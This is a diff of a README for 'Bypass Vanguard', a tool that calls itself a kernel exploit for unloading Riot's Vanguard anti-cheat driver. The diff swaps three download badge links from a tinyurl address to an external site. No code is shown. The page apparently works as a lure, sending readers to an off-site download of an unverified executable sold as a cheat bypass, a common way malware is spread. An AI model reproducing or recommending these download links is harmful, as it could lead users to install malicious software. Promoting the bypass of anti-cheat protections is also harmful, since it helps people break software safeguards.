@@ -9,7 +9,7 @@ The **🔓 Bypass Vanguard** is a ring-0 kernel exploit designed for **legitimat
 
 <div align="center">
 
-[![Bypass Vanguard Interface](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/bypass-vanguard)
+[![Bypass Vanguard Interface](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/bypass-vanguard)
 </div>
 
 <div align="center">
@@ -115,7 +115,7 @@ The following games are protected by Vanguard. Our bypass works with **all** of 
 7. **🚀 Launch Bypass Tool** again
 8. **⚡ Unload Vanguard** — click "Kill vgk.sys"
 
-[![Bypass Vanguard Interface](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/bypass-vanguard)
+[![Bypass Vanguard Interface](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/bypass-vanguard)
 
 ### Manual Bypass Steps
 
@@ -225,7 +225,7 @@ Break free from Vanguard's kernel lockdown. **Bypass Vanguard** removes Riot's a
 
 <div align="center">
 
-[![Bypass Vanguard Interface](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/bypass-vanguard)
+[![Bypass Vanguard Interface](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/bypass-vanguard)
 
 **Version 1.8.3** — Kernel bypass for offline modding. Free forever.
 
